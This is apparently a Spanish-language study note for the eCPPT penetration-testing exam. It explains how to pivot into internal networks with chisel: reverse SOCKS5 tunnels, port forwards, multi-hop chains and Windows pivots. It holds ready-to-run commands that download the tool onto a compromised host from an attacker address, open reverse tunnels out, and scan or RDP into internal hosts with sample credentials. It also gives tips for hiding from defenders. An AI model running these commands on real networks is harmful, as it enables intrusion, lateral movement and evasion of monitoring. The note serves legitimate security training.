## 📌 CHISEL — HTTP Tunneling y SOCKS5

### Qué es y por qué es diferente a socat

> [!info] **chisel**
> Herramienta de tunneling TCP/UDP sobre HTTP o HTTPS usando WebSockets. Implementa un modelo cliente-servidor: el **servidor** chisel escucha conexiones HTTP/HTTPS, y el **cliente** chisel conecta al servidor y establece túneles. La clave diferencial es que todo el tráfico de pivoting viaja encapsulado en peticiones WebSocket sobre HTTP/HTTPS — lo que hace que atraviese firewalls que permiten tráfico web saliente incluso cuando bloquean TCP arbitrario. Soporta SOCKS5 nativo, lo que lo hace directo reemplazo de `ssh -D` sin necesitar SSH.

| Escenario | SSH disponible | Usa |
|---|---|---|
| Acceso SSH al pivot | Sí | `ssh -D` o `ssh -R` |
| Solo shell en el pivot, no SSH | No | **chisel** o socat |
| Firewall bloquea puertos altos | No | **chisel** (HTTP/443) |
| Necesitas SOCKS5 + UDP | Cualquiera | **chisel** |

---

### Instalación y transferencia de chisel

> [!tip] Descargar chisel — mismos binarios para servidor y cliente
> ```bash
> # En el atacante — descargar binarios para Linux y Windows
> # Releases en: https://github.com/jpillora/chisel/releases
>
> # Linux x64
> wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
> gunzip chisel_linux_amd64.gz
> mv chisel_linux_amd64 chisel
> chmod +x chisel
>
> # Windows x64
> wget https://github.com/jpillora/chisel/releases/latest/download/chisel_windows_amd64.gz
> gunzip chisel_windows_amd64.gz
> mv chisel_windows_amd64 chisel.exe
>
> # Transferir el binario Linux al pivot
> scp chisel ubuntu@10.129.202.64:/tmp/chisel
>
> # O con servidor HTTP
> python3 -m http.server 8000
> # En el pivot:
> wget http://10.10.14.18:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel
> ```

> [!important] El mismo binario `chisel` actúa tanto de servidor como de cliente dependiendo del subcomando usado (`server` o `client`). No hay binarios separados — se descarga uno solo y se usa con diferentes argumentos según el rol.

---

### Arquitectura de chisel — Server vs Client
```
[ATACANTE]                              [PIVOT HOST]                 [RED INTERNA]
chisel server                           chisel client
  --port 1080                             10.10.14.18:1080
  --reverse                               R:socks               ←→    172.16.5.0/23
     ↑                                         |
     └─────── WebSocket sobre HTTP ────────────┘
```

**Dos modos principales:**

| Modo | Quién ejecuta server | Quién ejecuta client | Dirección del túnel |
|---|---|---|---|
| **Forward** | Pivot host | Atacante | Atacante conecta al pivot |
| **Reverse** | Atacante | Pivot host | Pivot conecta al atacante |

El modo **reverse** es el más usado en pentesting porque el pivot inicia la conexión hacia fuera (hacia el atacante), lo que suele estar permitido en firewalls de red corporativos que bloquean conexiones entrantes al pivot.

---

### Caso de uso 1 — SOCKS5 proxy con chisel (modo reverse)

**Escenario:** acceso al Ubuntu pivot, se quiere escanear toda la red interna `172.16.5.0/23` con nmap y usar otras herramientas a través de proxychains.

**Paso 1 — Iniciar el servidor chisel en el ATACANTE:**

> [!tip] Servidor chisel en el atacante esperando conexiones del pivot
> ```bash
> # En el atacante
> ./chisel server --port 1080 --reverse
> ```
> `server` — Modo servidor: espera conexiones entrantes de clientes chisel.
> `--port 1080` — Puerto donde el servidor chisel escuchará las conexiones WebSocket de los clientes.
> `--reverse` — Habilita el modo reverse: permite que los clientes abran puertos en el servidor (atacante). Sin esta flag, los clientes solo pueden usar puertos que el servidor expone activamente. Con `--reverse`, el cliente dicta qué túneles crear.

**Paso 2 — Conectar el cliente chisel desde el PIVOT:**

> [!tip] Cliente chisel en el pivot conectando al servidor del atacante
> ```bash
> # En el pivot Ubuntu
> ./chisel client 10.10.14.18:1080 R:socks
> ```
> `client` — Modo cliente: conecta al servidor chisel especificado.
> `10.10.14.18:1080` — IP y puerto del servidor chisel (el atacante).
> `R:socks` — **Tunnel specification**: `R` indica reverse (el cliente abre el túnel en el servidor), `socks` crea un servidor SOCKS5 en el atacante. El puerto por defecto del SOCKS5 es `1080` — el mismo que usa el servidor chisel. Para especificar otro puerto: `R:9050:socks`.

**Paso 3 — Configurar proxychains:**

> [!tip] Configurar proxychains para usar el SOCKS5 de chisel
> ```bash
> tail -3 /etc/proxychains.conf
> # Debe contener:
> # socks5 127.0.0.1 1080
>
> # Si tiene socks4, cambiar a socks5 (chisel crea SOCKS5)
> sudo sed -i 's/socks4/socks5/g' /etc/proxychains.conf
> # O editar manualmente y añadir:
> echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
> ```
> `socks5` — Chisel crea un proxy SOCKS **versión 5** — importante especificar `socks5` y no `socks4` en proxychains.conf.
> `127.0.0.1 1080` — El proxy SOCKS5 de chisel escucha localmente en el atacante en el puerto 1080.

**Paso 4 — Usar herramientas a través del proxy:**

> [!tip] Escanear la red interna con nmap a través del proxy SOCKS5 de chisel
> ```bash
> # Descubrimiento de hosts
> proxychains nmap -v -sn 172.16.5.1-254 -Pn
>
> # Escaneo de puertos en host específico
> proxychains nmap -v -Pn -sT -p22,80,443,445,3389,8080 172.16.5.19
>
> # RDP a través del proxy
> proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
>
> # CrackMapExec a través del proxy
> proxychains crackmapexec smb 172.16.5.0/24
>
> # curl a través del proxy
> proxychains curl http://172.16.5.19:8080
> ```

---

### Caso de uso 2 — Port forwarding local con chisel (modo reverse)

**Escenario:** se quiere acceder al puerto RDP (`3389`) de `172.16.5.19` directamente en un puerto local del atacante, sin proxychains.

**Paso 1 — Servidor chisel en el atacante (mismo que antes):**

> [!tip] Servidor chisel para port forwarding
> ```bash
> ./chisel server --port 8080 --reverse
> ```

**Paso 2 — Cliente chisel en el pivot con port forwarding específico:**

> [!tip] Cliente chisel configurando port forward local al RDP interno
> ```bash
> # En el pivot
> ./chisel client 10.10.14.18:8080 R:3389:172.16.5.19:3389
> ```
> `R:3389:172.16.5.19:3389` — Tunnel specification completa:
> - `R` — Reverse: el túnel se abre en el servidor (atacante).
> - `3389` — Puerto en el atacante donde quedará disponible el servicio.
> - `172.16.5.19` — Host destino en la red interna (visto desde el pivot).
> - `3389` — Puerto del servicio en el host destino.
> Resultado: `localhost:3389` en el atacante conecta directamente a `172.16.5.19:3389`.

**Paso 3 — Conectar desde el atacante directamente:**

> [!tip] Conectar al servicio interno usando el port forward de chisel
> ```bash
> # Sin proxychains — directo a localhost
> xfreerdp /v:localhost:3389 /u:victor /p:pass@123
>
> # O con un puerto local diferente para no interferir con servicios locales
> # En el pivot: ./chisel client 10.10.14.18:8080 R:13389:172.16.5.19:3389
> xfreerdp /v:localhost:13389 /u:victor /p:pass@123
> ```

---

### Caso de uso 3 — Port forwarding múltiple en un solo cliente

> [!tip] Múltiples port forwards en un solo comando chisel client
> ```bash
> # En el pivot — múltiples túneles simultáneos
> ./chisel client 10.10.14.18:8080 \
>     R:3389:172.16.5.19:3389 \
>     R:445:172.16.5.19:445 \
>     R:8080:172.16.5.100:80 \
>     R:socks
> ```
> Cada argumento adicional añade un túnel independiente. Se pueden combinar port forwards específicos con SOCKS5 general en el mismo cliente. El servidor chisel gestiona todos los túneles sobre la misma conexión WebSocket.

---

### Caso de uso 4 — chisel en modo FORWARD (cliente en atacante, server en pivot)

En este modo el servidor chisel corre en el pivot y el cliente en el atacante. Es menos común porque requiere que el pivot tenga un puerto accesible desde el atacante, pero es útil cuando no hay restricciones de firewall de entrada al pivot.

**Paso 1 — Servidor chisel en el PIVOT:**

> [!tip] Servidor chisel corriendo en el pivot host
> ```bash
> # En el pivot Ubuntu
> ./chisel server --port 8000 --socks5
> ```
> `--port 8000` — Puerto donde el servidor chisel escucha en el pivot.
> `--socks5` — Habilita el proxy SOCKS5 para clientes que se conecten. Sin esta flag, solo se pueden usar port forwards explícitos.

**Paso 2 — Cliente chisel en el ATACANTE conectando al pivot:**

> [!tip] Cliente chisel en el atacante conectando al servidor del pivot
> ```bash
> # En el atacante
> ./chisel client 10.129.202.64:8000 socks
> ```
> `10.129.202.64:8000` — IP y puerto del servidor chisel en el pivot.
> `socks` — Sin `R` — crea un SOCKS5 proxy local en el atacante (por defecto en puerto `1080`). El tráfico pasa por el pivot hacia la red interna.

---

### Caso de uso 5 — chisel con autenticación y TLS

> [!tip] Servidor chisel con TLS y autenticación básica
> ```bash
> # En el atacante — servidor chisel con TLS (usando certificado existente)
> ./chisel server --port 443 --reverse --tls-key server.key --tls-cert server.crt
>
> # O generando certificado autofirmado automáticamente
> ./chisel server --port 443 --reverse --tls-domain attacker.example.com
> ```
> `--tls-key / --tls-cert` — Usar certificados TLS propios. El tráfico chisel viaja sobre HTTPS — prácticamente indistinguible de tráfico web legítimo.
> `--tls-domain` — Chisel genera y usa automáticamente un certificado para el dominio especificado.

> [!tip] Servidor chisel con autenticación por usuario/contraseña
> ```bash
> # Servidor — definir credenciales
> ./chisel server --port 1080 --reverse --auth usuario:contraseña

> # Cliente — autenticarse
> ./chisel client --auth usuario:contraseña 10.10.14.18:1080 R:socks
> ```
> `--auth usuario:contraseña` — Protege el servidor chisel con autenticación básica. Cualquier cliente que no presente las credenciales correctas es rechazado. Importante en engagements donde el servidor chisel puede ser descubierto por el blue team.

---

### Caso de uso 6 — Multi-hop con chisel (pivot encadenado)

**Escenario:** tres redes. El atacante llega al Pivot1. Desde Pivot1 se llega al Pivot2. Desde Pivot2 se llega al Target final.
```
[Atacante 10.10.14.18] ←→ [Pivot1 10.129.202.64 / 172.16.5.129] ←→ [Pivot2 172.16.5.50 / 192.168.1.50] ←→ [Target 192.168.1.100]
```

**Paso 1 — Túnel Atacante ↔ Pivot1:**

> [!tip] Primera cadena: atacante como servidor, Pivot1 como cliente
> ```bash
> # Atacante
> ./chisel server --port 1080 --reverse
>
> # Pivot1
> ./chisel client 10.10.14.18:1080 R:socks
> ```
> Resultado: SOCKS5 en `127.0.0.1:1080` del atacante → tráfico sale por Pivot1 hacia `172.16.5.0/23`.

**Paso 2 — Túnel Pivot1 ↔ Pivot2 (usando proxychains):**

> [!tip] Segunda cadena: Pivot1 como servidor, Pivot2 como cliente — todo a través del primer túnel
> ```bash
> # En Pivot1 — lanzar servidor chisel para Pivot2
> # (Pivot1 ya tiene chisel instalado del paso anterior)
> ./chisel server --port 2080 --reverse &
>
> # En el atacante — conectar a Pivot2 usando proxychains (a través del primer túnel)
> # Primero transferir chisel a Pivot2 a través de Pivot1
> proxychains scp chisel ubuntu@172.16.5.50:/tmp/chisel
>
> # En Pivot2 (a través de shell obtenida vía proxychains)
> ./chisel client 172.16.5.129:2080 R:socks
> ```

**Paso 3 — Configurar proxychains para la cadena completa:**

> [!tip] Proxychains con cadena de dos proxies SOCKS5
> ```bash
> # /etc/proxychains.conf
> # Añadir ambos proxies en cadena
> # socks5 127.0.0.1 1080   ← primer túnel (hacia 172.16.5.0/23)
> # socks5 127.0.0.1 2080   ← segundo túnel (hacia 192.168.1.0/24)
>
> # Escanear el target final a través de ambos pivots
> proxychains nmap -Pn -sT -p445,3389,80 192.168.1.100
> ```

---

### Caso de uso 7 — chisel en Windows (pivot Windows)

Chisel tiene binario nativo para Windows — el uso es idéntico al de Linux.

> [!tip] Ejecutar chisel client en un pivot Windows
> ```powershell
> # Descargar chisel en el Windows pivot
> Invoke-WebRequest -Uri "http://10.10.14.18:8000/chisel.exe" -OutFile "C:\Windows\Temp\chisel.exe"

> # Ejecutar como cliente
> C:\Windows\Temp\chisel.exe client 10.10.14.18:1080 R:socks
>
> # Port forwarding específico desde Windows
> C:\Windows\Temp\chisel.exe client 10.10.14.18:1080 R:3389:192.168.1.100:3389
>
> # En background (no bloquea la terminal)
> Start-Process -FilePath "C:\Windows\Temp\chisel.exe" -ArgumentList "client 10.10.14.18:1080 R:socks" -WindowStyle Hidden
> ```
> `-WindowStyle Hidden` — Lanza chisel en background sin ventana visible — reduce la visibilidad en el sistema comprometido.

---

## 📐 Comparativa final — socat vs chisel vs SSH

| Criterio | socat | chisel | ssh -D / -R |
|---|---|---|---|
| Dependencias en pivot | Binario socat | Binario chisel | Servidor SSH + credenciales |
| Protocolo de transporte | TCP/UDP plano | HTTP/WebSocket (TCP) | SSH (TCP) |
| Bypass de firewall HTTP | ✗ | ✓ | ✗ |
| Proxy SOCKS5 nativo | ✗ | ✓ | SOCKS4/5 con -D |
| Cifrado del túnel | Solo con TLS manual | HTTP plano o HTTPS | Siempre cifrado |
| Multi-hop | Manual (cadena) | Sí (proxychains) | Sí (ProxyJump) |
| Reverse shell TTY | ✓ (la mejor opción) | ✗ | ✗ |
| Windows nativo | ✗ | ✓ | Solo con cliente SSH |
| Autenticación | ✗ | ✓ (--auth) | Siempre (SSH auth) |
| Facilidad de uso | Alta | Alta | Media |

---

## 🔗 Relaciones / Contexto

socat y chisel cubren los dos grandes gaps del pivoting con SSH: socat es insustituible para **shells TTY completamente interactivas** (el mejor método para obtener una shell funcional en Linux) y para **redirectores de un salto sin instalar nada adicional** (si socat ya está en el sistema). Chisel es la herramienta de elección cuando el firewall bloquea puertos TCP arbitrarios pero permite HTTP/HTTPS saliente — escenario extremadamente común en redes corporativas reales — y cuando se necesita un **proxy SOCKS5 robusto sin depender de SSH**. En el contexto del eCPPT, dominar ambas herramientas junto con `ssh -D/-R` y Meterpreter portfwd cubre prácticamente cualquier escenario de pivoting que puede aparecer en el examen o en un engagement real: desde redes con un único pivot hasta cadenas de tres o más saltos a través de segmentos completamente aislados.